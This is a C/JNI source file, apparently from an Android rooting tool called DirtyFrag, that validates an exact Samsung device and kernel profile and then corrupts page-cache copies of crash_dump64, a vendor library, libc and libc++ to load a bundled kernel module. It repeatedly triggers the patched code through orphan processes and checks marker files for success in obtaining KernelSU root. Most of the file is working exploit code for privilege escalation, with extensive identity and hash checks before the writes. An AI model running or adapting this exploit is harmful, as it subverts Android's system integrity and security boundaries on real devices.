    if (cls == DFR_TARGET_UPSTREAM_GENERIC) {
        REPORTLN("[DFR][TARGET] TARGET_PROFILE=UPSTREAM_GENERIC");
        REPORTLN("[DFR][TARGET] PASS (unrelated device; upstream generic path)");
        return 0;
    }

    /* Log each individual mismatch for the ZZIC candidate. */
    if (!m.manufacturer_ok) REPORTLN("[DFR][TARGET] MISMATCH manufacturer: got=%s want=%s", manufacturer, p->manufacturer);
    if (!m.model_ok)        REPORTLN("[DFR][TARGET] MISMATCH model: got=%s want=%s", model, p->model);
    if (!m.device_ok)       REPORTLN("[DFR][TARGET] MISMATCH device: got=%s want=%s", device, p->device);
    if (!m.sdk_ok)          REPORTLN("[DFR][TARGET] MISMATCH sdk: got=%d want=%d", obs.sdk, p->sdk);
    if (!m.android_release_ok) REPORTLN("[DFR][TARGET] MISMATCH android_release: got=%d want=%d", obs.android_release, p->android_release);
    if (!m.display_ok)      REPORTLN("[DFR][TARGET] MISMATCH display: got=%s want=%s", display, p->display);
    if (!m.fingerprint_ok)  REPORTLN("[DFR][TARGET] MISMATCH fingerprint: got=%s want=%s", fingerprint, p->fingerprint);
    if (!m.kernel_release_ok) REPORTLN("[DFR][TARGET] MISMATCH kernel_release: got=%s want=%s", u.release, p->kernel_release);
    if (!m.kernel_version_ok) REPORTLN("[DFR][TARGET] MISMATCH kernel_version: got=%s want=%s", u.version, p->kernel_version);
    if (!m.kernel_arch_ok)  REPORTLN("[DFR][TARGET] MISMATCH kernel_arch: got=%s want=%s", u.machine, p->kernel_arch);
    if (!m.page_size_ok)    REPORTLN("[DFR][TARGET] MISMATCH page_size: got=%ld want=%ld", page_size, p->page_size);
    if (!m.abi_ok)          REPORTLN("[DFR][TARGET] MISMATCH abi: got=%s want=%s", abi, p->abi);

    if (cls == DFR_TARGET_MISMATCH) {
        REPORTLN("[DFR][TARGET] TARGET_PROFILE=MISMATCH");
        REPORTLN("[DFR][TARGET] FAIL fail-closed: device asserts the ZZIC model/codename"
                 " but does not match the pinned firmware. Refusing.");
        return -1;
    }

    /* cls == DFR_TARGET_S25U_ZZIC: run Gate B. */
    REPORTLN("[DFR][TARGET] TARGET_PROFILE=S25U_ZZIC");
    REPORTLN("[DFR][TARGET] PASS exact identity");

    int rc = 0;
    REPORTLN("[DFR][KERNEL] ENTER");
    if (dfr_streq(u.release, p->kernel_release))
        REPORTLN("[DFR][KERNEL] ZZIC_KERNEL_IDENTITY=PASS");
    else { REPORTLN("[DFR][KERNEL] ZZIC_KERNEL_IDENTITY=FAIL got=%s want=%s", u.release, p->kernel_release); rc = -1; }

    if (dfr_streq(u.version, p->kernel_version))
        REPORTLN("[DFR][KERNEL] ZZIC_KERNEL_VERSION=PASS");
    else { REPORTLN("[DFR][KERNEL] ZZIC_KERNEL_VERSION=FAIL got=%s want=%s", u.version, p->kernel_version); rc = -1; }

    if (dfr_streq(u.machine, p->kernel_arch))
        REPORTLN("[DFR][KERNEL] ZZIC_KERNEL_ARCH=PASS (%s)", u.machine);
    else { REPORTLN("[DFR][KERNEL] ZZIC_KERNEL_ARCH=FAIL got=%s want=%s", u.machine, p->kernel_arch); rc = -1; }

    if (page_size == p->page_size)
        REPORTLN("[DFR][KERNEL] ZZIC_PAGE_SIZE=PASS (%ld)", page_size);
    else { REPORTLN("[DFR][KERNEL] ZZIC_PAGE_SIZE=FAIL got=%ld want=%ld", page_size, p->page_size); rc = -1; }

    REPORTLN("[DFR][USERSPACE] ENTER");
    /* libc.so must be the runtime bionic symlink; validate the resolved target. */
    char libc_real[512];
    ssize_t ll = readlink("/system/lib64/libc.so", libc_real, sizeof(libc_real) - 1);
    if (ll > 0) {
        libc_real[ll] = 0;
        REPORTLN("[DFR][USERSPACE] LIBC_SYMLINK=%s", libc_real);
    } else {
        REPORTLN("[DFR][USERSPACE] LIBC_SYMLINK not a symlink (errno=%d) - validating in place", errno);
    }

    /*
     * Hash only the artefact this stage is about to write, while it is still
     * pristine (see DFR_ART_* above). The artefacts this stage does not own are
     * reported SKIP so a log reader never mistakes an unhashed artefact for a
     * validated one.
     */
    if (artefacts & DFR_ART_CRASHDUMP) {
        if (gate_hash(reporter, "ZZIC_CRASHDUMP_IDENTITY", kCrashDump, p->crashdump_sha256, 1)) rc = -1;
    } else {
        REPORTLN("[DFR][USERSPACE] ZZIC_CRASHDUMP_IDENTITY SKIP (not this stage's artefact)");
    }
    if (artefacts & DFR_ART_VENDOR) {
        if (gate_hash(reporter, "ZZIC_VENDOR_ELF", target_lib_path, p->vendor_target_sha256, 1)) rc = -1;
    } else {
        REPORTLN("[DFR][USERSPACE] ZZIC_VENDOR_ELF SKIP (not this stage's artefact)");
    }
    if (artefacts & DFR_ART_LIBC) {
        if (gate_hash(reporter, "ZZIC_LIBC_IDENTITY", "/system/lib64/libc.so", p->libc_sha256, 1)) rc = -1;
    } else {
        REPORTLN("[DFR][USERSPACE] ZZIC_LIBC_IDENTITY SKIP (not this stage's artefact)");
    }
    if (artefacts & DFR_ART_LIBCXX) {
        if (gate_hash(reporter, "ZZIC_LIBCXX_IDENTITY", "/system/lib64/libc++.so", p->libcxx_sha256, 1)) rc = -1;
    } else {
        REPORTLN("[DFR][USERSPACE] ZZIC_LIBCXX_IDENTITY SKIP (not this stage's artefact)");
    }

    if (rc == 0) {
        REPORTLN("[DFR][KERNEL] PASS");
        REPORTLN("[DFR][USERSPACE] PASS");
        REPORTLN("[DFR][TARGET] gate A/B complete: proceeding on validated ZZIC target");
    } else {
        REPORTLN("[DFR][TARGET] FAIL fail-closed: ZZIC identity but a kernel/userspace"
                 " boundary did not validate. Refusing before any patch.");
    }
    return rc;
}

int patch_ko(struct Reporter *reporter) {
    /*
     * Fail-closed Gate A/B chokepoint: no page-cache corruption runs until the
     * exact ZZIC target is validated (or the device is proven unrelated and
     * takes the upstream generic path). A partial ZZIC match aborts here.
     */
    dfr_target_class cls = DFR_TARGET_UPSTREAM_GENERIC;
    /* patch_ko() writes BOTH crash_dump64 (patch #1) and the vendor file
     * (patch #2), so it owns both artefact boundaries. */
    if (gate_target(reporter, &cls, DFR_ART_CRASHDUMP | DFR_ART_VENDOR) != 0) {
        REPORTLN("[DFR][TARGET] aborting: target gate refused");
        return 1;
    }

    /*
     * Module selection and the Gate-G module policy are resolved BEFORE the
     * first write: both are pure lookups, and a refusal here must not leave
     * crash_dump64 already corrupted in the page cache.
     */
    int android_release = 0;
    int kver_major = 0;
    int kver_minor = 0;
    if (read_device_versions(&android_release, &kver_major, &kver_minor) != 0) {
        REPORTLN("unsupported device: version check failed");
        LOGE("version check failed");
        return 1;
    }
    const struct KoImage *ko = select_ko_image(android_release, kver_major, kver_minor);
    if (ko == NULL) {
        REPORTLN("unsupported kernel %d.%d android %d", kver_major, kver_minor, android_release);
        LOGE("unsupported kernel %d.%d android %d", kver_major, kver_minor, android_release);
        return 1;
    }
    REPORTLN("* ko android%d-%d.%d (%d bytes)", ko->android_release, ko->kver_major, ko->kver_minor, (int)(ko->end - ko->start));

    /*
     * Fail-closed module policy: on the exact ZZIC target the generic
     * android15-6.6 image remains UNVERIFIED.  Missing evidence is never an
     * execution override: the exact target may proceed only when a module has
     * been positively validated and cryptographically bound to this profile.
     */
    if (cls == DFR_TARGET_S25U_ZZIC) {
        REPORTLN("[DFR][MODULE] ENTER");
        if (!DFR_PROFILE_ZZIC.ko_zzic_verified) {
            REPORTLN("[DFR][MODULE] GENERIC_ANDROID15_6_6_MODULE=UNVERIFIED (no ZZIC-validated .ko bundled)");
            REPORTLN("[DFR][MODULE] FAIL fail-closed: refusing an unverified module on ZZIC.");
            return 1;
        } else {
            /*
             * ko_zzic_verified=1 is only honoured when the bytes about to be
             * written are provably the ones that were validated. A flag without
             * a pinned digest, or a digest that does not match the selected
             * payload, is a refusal - never an assumption (dossier section 39).
             */
            const char *want = DFR_PROFILE_ZZIC.ko_sha256;
            if (want == NULL || want[0] == 0) {
                REPORTLN("[DFR][MODULE] FAIL ko_zzic_verified=1 but no ko_sha256 is pinned;"
                         " the flag alone is not evidence. Refusing.");
                return 1;
            }
            dfr_sha256_ctx sc;
            uint8_t digest[32];
            char hex[65];
            dfr_sha256_init(&sc);
            dfr_sha256_update(&sc, ko->start, (size_t)(ko->end - ko->start));
            dfr_sha256_final(&sc, digest);
            dfr_sha256_hex(digest, hex);
            REPORTLN("[DFR][MODULE] ko_filename=%s",
                     DFR_PROFILE_ZZIC.ko_filename ? DFR_PROFILE_ZZIC.ko_filename : "<unnamed>");
            REPORTLN("[DFR][MODULE] ko_sha256_actual=%s", hex);
            if (strcmp(hex, want) != 0) {
                REPORTLN("[DFR][MODULE] FAIL module digest does not match the profile.");
                REPORTLN("[DFR][MODULE]   expected=%s", want);
                REPORTLN("[DFR][MODULE] refusing: the bundled module is not the validated one.");
                return 1;
            }
            REPORTLN("[DFR][MODULE] ZZIC_MODULE_BINDING=PASS (bundled bytes match pinned digest)");
        }
    }

    //char buf[] = {1,2,3,4};
    LOGD("patch1");
    size_t len = splice_helper_end - splice_helper_start;
    // "/vendor/lib/libstagefright_soft_g711dec.so"
    LOGD("patching crashdump");
    REPORTLN("* patch #1");
    int ret =
    patch_file(kCrashDump, splice_helper_start, len, 0, 0xdead0000, 0, reporter);

    LOGD("patch crashdump ret %d", ret);
    if (ret) {
        REPORTLN("patch #1 ret %d", ret);
        return ret;
    }

    len = ko->end - ko->start;

    LOGD("patching vendorfile");
    REPORTLN("* patching #2");
    ret = patch_file("[vendorfile]", (char *)ko->start, len, 0, 0xdead0000, 1, reporter);
        // patch_file("", buf, sizeof(buf), 0, 0xdead0000, 1);

    LOGD("patch2 ret %d", ret);
    if (ret) {
        REPORTLN("patch #2 ret %d", ret);
    }

    return ret;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_patchMod(JNIEnv *env, jclass clazz) {
    LOGI("starting patchMod uid=%d", getuid());
    /*
    int fd = open(kCrashDump, O_RDONLY);
    LOGD("leaked crashdump32 fd %d", fd);
    struct stat st;
    fstat(fd, &st);
    LOGD("mmap sz %zu", st.st_size);
    void *addr = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    LOGD("mmap addr %p", addr);*/

    pid_t cpid = fork();
    if (cpid < 0) return 1;

    if (cpid == 0) {
        int rc = patch_ko(NULL);
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        LOGE("corruption stage failed (status=0x%x)", cstatus);
        return 1;
    }

    LOGI("page-cache patched");
    return 0;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_patchLibc(JNIEnv *env, jclass clazz) {
    LOGI("starting patchLibc uid=%d", getuid());
    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = patch_libc(NULL);
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        LOGE("corruption stage failed (status=0x%x)", cstatus);
        return 1;
    }

    LOGI("page-cache patched");
    return 0;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_patchCxx(JNIEnv *env, jclass clazz) {
    LOGI("starting patchCxx uid=%d", getuid());
    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = patch_cxx(0, NULL);
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        LOGE("corruption stage failed (status=0x%x)", cstatus);
        return 1;
    }

    LOGI("page-cache patched");
    return 0;
}

static int createOrphanProcess() {

    int pid = fork();
    if (pid < 0) {
        PLOGE("fork");
    } else if (pid == 0) {
        int pid2 = fork();
        if (pid2 < 0) {
            PLOGE("fork2");
        } else if (pid2 == 0) {
            sleep(1);
            _exit(0);
        } else {
            LOGD("created orphan process %d", pid2);
            _exit(0);
        }
    } else {
        TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    }
    return 0;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_createOrphanProcess(JNIEnv *env, jclass clazz) {
    return createOrphanProcess();
}

static int has_mutex() {
    return access("/dev/df", F_OK) == 0 || errno != ENOENT;
}
static int has_mark(int num) {
    char buf[100];
    sprintf(buf, "/dev/dfm%d", num);
    return access(buf, F_OK) == 0 || errno != ENOENT;
}

JNIEXPORT jint JNICALL
Java_org_lsposed_lspromise_DirtyFrag_runAll(JNIEnv *env, jobject thiz) {
    struct Reporter reporterobj = {
        .env = env,
        .obj = thiz
    }, *reporter = &reporterobj;
    if (patch_ko(reporter)) {
        return 3;
    }
    if (patch_libc(reporter)) {
        return 3;
    }
    if (patch_cxx(0, reporter)) {
        return 3;
    }
    for (int i = 0; i < 8; i++) {
        usleep(500000);
        REPORTLN("* trying to trigger (%d)..", i);
        createOrphanProcess();
        usleep(500000);
        int mark = has_mutex();
        int mark2 = has_mark(2);
        int mark3 = has_mark(3);
        int mark4 = has_mark(4);
        REPORTLN("mark: %d %d %d %d", mark, mark2, mark3, mark4);
        if (mark4) {
            REPORTLN("Failed (failure marker set). See logcat for details.\n");
            return 1;
        }
        if (mark3) {
            REPORTLN("Done. Check KSU Manager.\n");
            return 0;
        }
    }
    REPORTLN("no success signal; verify via manager app + logcat");
    return 2;
}
